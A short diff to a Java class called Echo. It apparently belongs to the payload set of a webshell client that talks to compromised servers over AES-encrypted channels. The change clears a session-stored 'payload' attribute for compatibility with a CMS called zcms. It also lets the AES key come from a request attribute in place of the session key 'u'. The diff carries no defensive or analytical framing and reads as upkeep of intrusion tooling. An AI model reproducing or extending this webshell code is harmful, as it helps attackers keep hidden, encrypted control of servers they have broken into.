@@ -35,6 +35,10 @@ public class Echo
         this.Request = page.getRequest();
         page.getResponse().setCharacterEncoding("UTF-8");
         final Map<String, String> result = new HashMap<String, String>();
+        //兼容zcms
+        if(Session.getAttribute("payload")!=null){
+            Session.removeAttribute("payload");
+        }
         try {
             result.put("msg", Echo.content);
             result.put("status", "success");
@@ -89,7 +93,8 @@ public class Echo
     }
     
     private byte[] Encrypt(final byte[] bs) throws Exception {
-        final String key = this.Session.getAttribute("u").toString();
+        final Object custmKeyObj = Request.getAttribute("parameters");
+        final String key = (custmKeyObj!=null&&custmKeyObj instanceof String) ? custmKeyObj.toString():this.Session.getAttribute("u").toString();
         final byte[] raw = key.getBytes("utf-8");
         final SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
         final Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
